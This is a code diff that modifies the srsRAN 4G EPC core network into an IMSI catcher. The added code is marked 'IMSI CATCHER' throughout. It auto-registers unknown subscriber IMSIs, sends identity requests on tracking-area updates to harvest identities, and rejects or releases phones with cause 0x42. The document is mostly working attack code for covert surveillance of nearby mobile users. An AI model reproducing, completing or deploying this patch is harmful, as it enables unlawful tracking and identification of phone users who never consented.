@@ -1,0 +1,370 @@
+--- srsran_4G/lib/include/srsran/interfaces/epc_interfaces.h	2023-07-16 00:41:34.218630012 +0200
++++ srsran_4g/lib/include/srsran/interfaces/epc_interfaces.h	2023-07-16 00:13:01.853568561 +0200
+@@ -89,6 +89,7 @@
+   virtual bool gen_auth_info_answer(uint64_t imsi, uint8_t* k_asme, uint8_t* autn, uint8_t* rand, uint8_t* xres) = 0;
+   virtual bool gen_update_loc_answer(uint64_t imsi, uint8_t* qci)                                                = 0;
+   virtual bool resync_sqn(uint64_t imsi, uint8_t* auts)                                                          = 0;
++  virtual bool Add_UE_IMSI(uint64_t imsi)                                                                        = 0;
+ };
+ 
+ class mme_interface_nas // NAS -> MME
+diff -ru srsran_4G/srsepc/hdr/hss/hss.h srsran_4g/srsepc/hdr/hss/hss.h
+--- srsran_4G/srsepc/hdr/hss/hss.h	2023-07-16 00:41:34.458631272 +0200
++++ srsran_4g/srsepc/hdr/hss/hss.h	2023-07-16 00:13:01.853568561 +0200
+@@ -82,6 +82,11 @@
+ 
+   virtual bool gen_auth_info_answer(uint64_t imsi, uint8_t* k_asme, uint8_t* autn, uint8_t* rand, uint8_t* xres);
+   virtual bool gen_update_loc_answer(uint64_t imsi, uint8_t* qci);
++  
++  // IMSI CATCHER
++  virtual bool          Add_UE_IMSI(uint64_t imsi);
++
++
+ 
+   virtual bool resync_sqn(uint64_t imsi, uint8_t* auts);
+ 
+diff -ru srsran_4G/srsepc/hdr/mme/nas.h srsran_4g/srsepc/hdr/mme/nas.h
+--- srsran_4G/srsepc/hdr/mme/nas.h	2023-07-16 00:41:34.458631272 +0200
++++ srsran_4g/srsepc/hdr/mme/nas.h	2023-07-16 00:13:01.857568582 +0200
+@@ -246,6 +246,8 @@
+   bool pack_service_reject(srsran::byte_buffer_t* nas_buffer, uint8_t emm_cause);
+   bool pack_tracking_area_update_reject(srsran::byte_buffer_t* nas_buffer, uint8_t emm_cause);
+   bool pack_attach_accept(srsran::byte_buffer_t* nas_buffer);
++  // IMSI CATCHER
++  bool pack_attach_reject(srsran::byte_buffer_t* nas_buffer, uint8_t emm_cause);
+ 
+   /* Security functions */
+   bool integrity_check(srsran::byte_buffer_t* pdu, bool warn_failure = true);
+diff -ru srsran_4G/srsepc/src/hss/hss.cc srsran_4g/srsepc/src/hss/hss.cc
+--- srsran_4G/srsepc/src/hss/hss.cc	2023-07-16 00:41:34.458631272 +0200
++++ srsran_4g/srsepc/src/hss/hss.cc	2023-07-16 00:13:01.857568582 +0200
+@@ -179,6 +179,37 @@
+   return true;
+ }
+ 
++
++
++// IMSI CATCHER
++bool hss::Add_UE_IMSI(uint64_t imsi)
++{
++  std::map<uint64_t, std::unique_ptr<hss_ue_ctx_t> >::iterator ue_ctx_it = m_imsi_to_ue_ctx.find(imsi);
++  if (ue_ctx_it == m_imsi_to_ue_ctx.end()) {
++    m_logger.info("sh-ma: User not found. IMSI: %015" PRIu64 "", imsi);
++    srsran::console("Shima: User not found at HSS. IMSI: %015" PRIu64 "\n", imsi);
++    std::unique_ptr<hss_ue_ctx_t> ue_ctx = std::unique_ptr<hss_ue_ctx_t>(new hss_ue_ctx_t);
++    ue_ctx->name = "ue";
++    ue_ctx->algo = HSS_ALGO_XOR;
++    ue_ctx->imsi = imsi;
++    ue_ctx->static_ip_addr = "0.0.0.0";
++    m_imsi_to_ue_ctx.insert(std::make_pair(ue_ctx->imsi, std::move(ue_ctx)));
++    m_logger.info("Shima: User Add to HSS. IMSI: %015" PRIu64 "", imsi);
++    srsran::console("Shima: User Add to HSS. IMSI: %015" PRIu64 "\n", imsi);
++    return false;
++  }
++  return true;
++}
++// IMSI CATCHER
++
++
++
++
++
++
++
++
++
+ bool hss::write_db_file(std::string db_filename)
+ {
+   std::string line;
+diff -ru srsran_4G/srsepc/src/mme/nas.cc srsran_4g/srsepc/src/mme/nas.cc
+--- srsran_4G/srsepc/src/mme/nas.cc	2023-07-16 00:41:34.462631293 +0200
++++ srsran_4g/srsepc/src/mme/nas.cc	2023-07-16 00:36:52.953152620 +0200
+@@ -264,6 +264,19 @@
+ 
+   // Save attach request type
+   nas_ctx->m_emm_ctx.attach_type = attach_req.eps_attach_type;
++   
++
++  // IMSI CATCHER
++  // Allocate eKSI for this authentication vector
++  // Here we assume a new security context thus a new eKSI
++  nas_ctx->m_sec_ctx.eksi = 0;
++
++  // Save the UE context
++  s1ap->add_nas_ctx_to_imsi_map(nas_ctx);
++  s1ap->add_nas_ctx_to_mme_ue_s1ap_id_map(nas_ctx);
++  s1ap->add_ue_to_enb_set(enb_sri->sinfo_assoc_id, nas_ctx->m_ecm_ctx.mme_ue_s1ap_id);
++
++  // IMSI CATCHER
+ 
+   // Get Authentication Vectors from HSS
+   if (!hss->gen_auth_info_answer(nas_ctx->m_emm_ctx.imsi,
+@@ -273,17 +286,37 @@
+                                  nas_ctx->m_sec_ctx.xres)) {
+     srsran::console("User not found. IMSI %015" PRIu64 "\n", nas_ctx->m_emm_ctx.imsi);
+     nas_logger.info("User not found. IMSI %015" PRIu64 "", nas_ctx->m_emm_ctx.imsi);
++    // s1ap_interface_nas* s1ap = itf.s1ap;
++    srsran::unique_byte_buffer_t nas_tx = srsran::make_byte_buffer();
++    if (nas_tx == nullptr) {
++     nas_logger.error("Couldn't allocate PDU in %s().", __FUNCTION__);
++     return false;
++    }
++    
++    // IMSI CATCHE
++    
++    // nas_ctx->pack_attach_reject(nas_tx.get(), LIBLTE_MME_EMM_CAUSE_ROAMING_NOT_ALLOWED_IN_THIS_TRACKING_AREA);
++    // // Send reply
++    // s1ap->send_downlink_nas_transport(
++    // nas_ctx->m_ecm_ctx.enb_ue_s1ap_id, nas_ctx->m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), nas_ctx->m_ecm_ctx.enb_sri);
++    // m_s1ap->send_ue_context_release_command(m_ecm_ctx.mme_ue_s1ap_id);
++    s1ap->send_ue_context_release_command(nas_ctx->m_ecm_ctx.mme_ue_s1ap_id);
++    // m_s1ap->release_ue_ecm_ctx(m_ecm_ctx.mme_ue_s1ap_id);
++    srsran::console("IMSI CATCHER: imsi attach unknown UE: send_ue_context_release_command\n");
++
++    // IMSI CATCHER
+     return false;
+   }
+ 
++  // IMSI CATCHER ---- > comment next two
+   // Allocate eKSI for this authentication vector
+   // Here we assume a new security context thus a new eKSI
+-  nas_ctx->m_sec_ctx.eksi = 0;
++  // nas_ctx->m_sec_ctx.eksi = 0;
+ 
+   // Save the UE context
+-  s1ap->add_nas_ctx_to_imsi_map(nas_ctx);
+-  s1ap->add_nas_ctx_to_mme_ue_s1ap_id_map(nas_ctx);
+-  s1ap->add_ue_to_enb_set(enb_sri->sinfo_assoc_id, nas_ctx->m_ecm_ctx.mme_ue_s1ap_id);
++  // s1ap->add_nas_ctx_to_imsi_map(nas_ctx);
++  // s1ap->add_nas_ctx_to_mme_ue_s1ap_id_map(nas_ctx);
++  // s1ap->add_ue_to_enb_set(enb_sri->sinfo_assoc_id, nas_ctx->m_ecm_ctx.mme_ue_s1ap_id);
+ 
+   // Pack NAS Authentication Request in Downlink NAS Transport msg
+   nas_tx = srsran::make_byte_buffer();
+@@ -843,14 +876,45 @@
+   nas nas_tmp(args, itf);
+   nas_tmp.m_ecm_ctx.enb_ue_s1ap_id = enb_ue_s1ap_id;
+   nas_tmp.m_ecm_ctx.mme_ue_s1ap_id = s1ap->get_next_mme_ue_s1ap_id();
++  
++  // IMSI CATCHER
++  // nas_tmp.m_ecm_ctx.enb_sri = enb_sri->sinfo_assoc_id;
+ 
+   srsran::unique_byte_buffer_t nas_tx = srsran::make_byte_buffer();
+   if (nas_tx == nullptr) {
+     nas_logger.error("Couldn't allocate PDU in %s().", __FUNCTION__);
+     return false;
+   }
+-  nas_tmp.pack_tracking_area_update_reject(nas_tx.get(), LIBLTE_MME_EMM_CAUSE_IMPLICITLY_DETACHED);
+-  s1ap->send_downlink_nas_transport(enb_ue_s1ap_id, nas_tmp.m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), *enb_sri);
++
++  // IMSI CATCHER
++  // nas_tmp.pack_tracking_area_update_reject(nas_tx.get(), LIBLTE_MME_EMM_CAUSE_IMPLICITLY_DETACHED);
++  // s1ap->send_downlink_nas_transport(enb_ue_s1ap_id, nas_tmp.m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), *enb_sri);
++  
++  // IMSI CATCHER
++  nas* nas_ctx;
++  nas_ctx = new nas(args, itf);
++  nas_ctx->m_ecm_ctx.enb_ue_s1ap_id = nas_tmp.m_ecm_ctx.enb_ue_s1ap_id ;
++  nas_ctx->m_ecm_ctx.mme_ue_s1ap_id = nas_tmp.m_ecm_ctx.mme_ue_s1ap_id ;
++  nas_ctx->m_ecm_ctx.state = nas_tmp.m_ecm_ctx.state;
++  memcpy(&nas_ctx->m_ecm_ctx.enb_sri, enb_sri, sizeof(struct sctp_sndrcvinfo));
++  // nas_ctx->m_ecm_ctx.enb_sri = nas_tmp.m_ecm_ctx.enb_sri;
++  nas_ctx->m_emm_ctx.imsi = 0;
++  nas_ctx->m_emm_ctx.state = nas_tmp.m_emm_ctx.state ;
++  nas_ctx->m_emm_ctx.ue_ip = nas_tmp.m_emm_ctx.ue_ip ;
++  nas_ctx->m_esm_ctx->state = nas_tmp.m_esm_ctx->state;
++  // nas_ctx->m_emm_ctx.procedure_transaction_id = nas_tmp.
++  // nas_ctx->m_ecm_ctx = nas_tmp.m_ecm_ctx;
++  // nas_ctx->m_emm_ctx = nas_tmp.m_emm_ctx;
++  s1ap->add_nas_ctx_to_mme_ue_s1ap_id_map(nas_ctx);
++  s1ap->add_ue_to_enb_set(enb_sri->sinfo_assoc_id, nas_ctx->m_ecm_ctx.mme_ue_s1ap_id);
++  // find_nas_ctx_from_mme_ue_s1ap_id(nas_tmp.m_ecm_ctx.mme_ue_s1ap_id);
++  // s1ap->send_ue_context_release_command(nas_tmp.m_ecm_ctx.mme_ue_s1ap_id);
++  nas_ctx->pack_identity_request(nas_tx.get());
++  s1ap->send_downlink_nas_transport(
++      nas_ctx->m_ecm_ctx.enb_ue_s1ap_id, nas_ctx->m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), nas_ctx->m_ecm_ctx.enb_sri);
++  srsran::console("IMSI CATCHER : TAU request : send identity request\n");
++  
++  // IMSI CATCHER
+   return true;
+ }
+ 
+@@ -940,6 +1004,33 @@
+             m_emm_ctx.imsi, m_sec_ctx.k_asme, m_sec_ctx.autn, m_sec_ctx.rand, m_sec_ctx.xres)) {
+       srsran::console("User not found. IMSI %015" PRIu64 "\n", m_emm_ctx.imsi);
+       m_logger.info("User not found. IMSI %015" PRIu64 "", m_emm_ctx.imsi);
++
++      // IMSI CATCHER
++
++      srsran::unique_byte_buffer_t nas_tx = srsran::make_byte_buffer();
++      if (nas_tx == nullptr) {
++      m_logger.error("Couldn't allocate PDU in %s().", __FUNCTION__);
++      return false;
++      }
++      //implemented by shima //
++      if (m_hss->Add_UE_IMSI(imsi)){
++        nas_tx = srsran::make_byte_buffer();
++        if (nas_tx == nullptr) {
++          m_logger.error("Couldn't allocate PDU in %s().", __FUNCTION__);
++          return false;
++        }
++        m_logger.info("User found at HSS. IMSI: %015" PRIu64 "", imsi);
++        srsran::console("User found at HSS. IMSI: %015" PRIu64 "\n", imsi);
++        pack_attach_reject(nas_tx.get(), 0x42);
++        // Send reply
++        m_s1ap->send_downlink_nas_transport(
++        m_ecm_ctx.enb_ue_s1ap_id, m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), m_ecm_ctx.enb_sri);
++      }
++      // m_s1ap->send_ue_context_release_command(m_ecm_ctx.mme_ue_s1ap_id);
++      // s1ap->send_ue_context_release_command(ecm_ctx->mme_ue_s1ap_id);
++      // m_s1ap->release_ue_ecm_ctx(m_ecm_ctx.mme_ue_s1ap_id);
++      
++      // IMSI CATCHER
+       return false;
+     }
+ 
+@@ -1217,11 +1308,44 @@
+   m_emm_ctx.imsi = imsi;
+ 
+   // Get Authentication Vectors from HSS
+-  if (!m_hss->gen_auth_info_answer(imsi, m_sec_ctx.k_asme, m_sec_ctx.autn, m_sec_ctx.rand, m_sec_ctx.xres)) {
+-    srsran::console("User not found. IMSI %015" PRIu64 "\n", imsi);
+-    m_logger.info("User not found. IMSI %015" PRIu64 "", imsi);
++
++  // IMSI CATCHER
++
++  // if (!m_hss->gen_auth_info_answer(imsi, m_sec_ctx.k_asme, m_sec_ctx.autn, m_sec_ctx.rand, m_sec_ctx.xres)) {
++  //   srsran::console("User not found. IMSI %015" PRIu64 "\n", imsi);
++  //   m_logger.info("User not found. IMSI %015" PRIu64 "", imsi);
++  //   return false;
++  // }
++
++  // IMSI CATCHER
++  if (m_hss->Add_UE_IMSI(imsi)){
++    nas_tx = srsran::make_byte_buffer();
++    if (nas_tx == nullptr) {
++      m_logger.error("Couldn't allocate PDU in %s().", __FUNCTION__);
++      return false;
++    }
++    m_logger.info("User found at HSS. IMSI: %015" PRIu64 "", imsi);
++    srsran::console("User found at HSS. IMSI: %015" PRIu64 "\n", imsi);
++    pack_tracking_area_update_reject(nas_tx.get(), 0x42);
++    m_s1ap->send_downlink_nas_transport(
++      m_ecm_ctx.enb_ue_s1ap_id, m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), m_ecm_ctx.enb_sri);
++    m_logger.info("handle identity response : send reject massage with ROAMING_NOT_ALLOWED_IN_THIS_TRACKING_AREA cause");
++    // s1ap_interface_nas* s1ap = itf.s1ap;
++    // pack_attach_reject(nas_tx.get(), LIBLTE_MME_EMM_CAUSE_ROAMING_NOT_ALLOWED_IN_THIS_TRACKING_AREA );
++    // // Send reply
++    // m_s1ap->send_downlink_nas_transport(
++    //   m_ecm_ctx.enb_ue_s1ap_id, m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), m_ecm_ctx.enb_sri);
++    // m_s1ap->send_ue_context_release_command(m_ecm_ctx.mme_ue_s1ap_id);
++    // s1ap->send_ue_context_release_command(ecm_ctx->mme_ue_s1ap_id);
++    // m_s1ap->release_ue_ecm_ctx(m_ecm_ctx.mme_ue_s1ap_id);
++    return false;
++  }else{
++    m_logger.info("handle identity response");
+     return false;
+   }
++  // IMSI CATCHER
++
++
+   // Identity reponse from unknown GUTI atach. Assigning new eKSI.
+   m_sec_ctx.eksi = 0;
+ 
+@@ -1266,6 +1390,7 @@
+     m_logger.error("Couldn't allocate PDU in %s().", __FUNCTION__);
+     return false;
+   }
++  
+   // TODO we could enable integrity protection in some cases, but UE should comply anyway
+   pack_tracking_area_update_reject(nas_tx.get(), LIBLTE_MME_EMM_CAUSE_IMPLICITLY_DETACHED);
+   // Send reply
+@@ -1737,6 +1862,28 @@
+   return true;
+ }
+ 
++// IMSI CATCHER
++bool nas::pack_attach_reject(srsran::byte_buffer_t* nas_buffer, uint8_t emm_cause)
++{
++  m_logger.info("attach Reject packing message");
++
++  LIBLTE_MME_ATTACH_REJECT_MSG_STRUCT att_rej;
++  att_rej.t3446_value_present = false;
++  att_rej.t3446_value = 0;
++  att_rej.esm_msg_present = false;
++  att_rej.emm_cause = emm_cause;
++
++  LIBLTE_ERROR_ENUM err = liblte_mme_pack_attach_reject_msg(&att_rej, (LIBLTE_BYTE_MSG_STRUCT*)nas_buffer);
++  if (err != LIBLTE_SUCCESS) {
++    m_logger.error("Error packing Attach Reject");
++    srsran::console("Error packing Attach Reject\n");
++    return false;
++  }
++  return true;
++}
++// IMSI CATCHER
++
++
+ /************************
+  *
+  * Security Functions
+diff -ru srsran_4G/srsepc/src/mme/s1ap_ctx_mngmt_proc.cc srsran_4g/srsepc/src/mme/s1ap_ctx_mngmt_proc.cc
+--- srsran_4G/srsepc/src/mme/s1ap_ctx_mngmt_proc.cc	2023-07-16 00:41:34.462631293 +0200
++++ srsran_4g/srsepc/src/mme/s1ap_ctx_mngmt_proc.cc	2023-07-16 00:13:01.857568582 +0200
+@@ -273,11 +273,13 @@
+   emm_ctx_t* emm_ctx = &nas_ctx->m_emm_ctx;
+   ecm_ctx_t* ecm_ctx = &nas_ctx->m_ecm_ctx;
+ 
+-  if (ecm_ctx->state != ECM_STATE_CONNECTED) {
+-    m_logger.error("UE is not ECM connected. No send context release command. MME UE S1AP Id %d",
+-                   ecm_ctx->mme_ue_s1ap_id);
+-    return false;
+-  }
++
++// IMSI CATCHER
++  // if (ecm_ctx->state != ECM_STATE_CONNECTED) {
++  //   m_logger.error("UE is not ECM connected. No send context release command. MME UE S1AP Id %d",
++  //                  ecm_ctx->mme_ue_s1ap_id);
++  //   return false;
++  // }
+ 
+   // Detect weather there are active E-RABs
+   bool active_erabs = false;
+@@ -323,7 +325,7 @@
+     m_logger.error("Error sending UE Context Release Command.");
+     return false;
+   }
+-
++  srsran::console("IMSI CATCHER : send_ue_context_release_command\n");
+   return true;
+ }
+ 
+diff -ru srsran_4G/srsepc/src/mme/s1ap_nas_transport.cc srsran_4g/srsepc/src/mme/s1ap_nas_transport.cc
+--- srsran_4G/srsepc/src/mme/s1ap_nas_transport.cc	2023-07-16 00:41:34.462631293 +0200
++++ srsran_4g/srsepc/src/mme/s1ap_nas_transport.cc	2023-07-16 00:13:01.857568582 +0200
+@@ -102,6 +102,7 @@
+   uint64_t imsi           = 0;
+   uint32_t m_tmsi         = 0;
+   uint32_t enb_ue_s1ap_id = init_ue->enb_ue_s1ap_id.value.value;
++  // uint32_t mme_ue_s1ap_id = init_ue->mme_group_id.  
+   liblte_mme_parse_msg_header((LIBLTE_BYTE_MSG_STRUCT*)nas_msg.get(), &pd, &msg_type);
+ 
+   srsran::console("Initial UE message: %s\n", liblte_nas_msg_type_to_string(msg_type));
+@@ -254,11 +255,16 @@
+       m_logger.info("UL NAS: Attach Request");
+       srsran::console("UL NAS: Attach Resquest\n");
+       nas_ctx->handle_attach_request(nas_msg.get());
++      srsran::console("IMSI CATCHER: uplink nas transport : attach request : send_ue_context_release_command\n");
++      m_s1ap->send_ue_context_release_command(nas_ctx->m_ecm_ctx.mme_ue_s1ap_id);
+       break;
+     case LIBLTE_MME_MSG_TYPE_IDENTITY_RESPONSE:
+       m_logger.info("UL NAS: Received Identity Response");
+-      srsran::console("UL NAS: Received Identity Response\n");
++      srsran::console("IMSI CATCHER:\n");
+       nas_ctx->handle_identity_response(nas_msg.get());
++      srsran::console("UL NAS: Received Identity Response: send_ue_context_release_command\n");
++      // nas_ctx->handle_identity_response(nas_msg.get());
++      m_s1ap->send_ue_context_release_command(nas_ctx->m_ecm_ctx.mme_ue_s1ap_id);
+       break;
+     case LIBLTE_MME_MSG_TYPE_AUTHENTICATION_RESPONSE:
+       m_logger.info("UL NAS: Received Authentication Response");
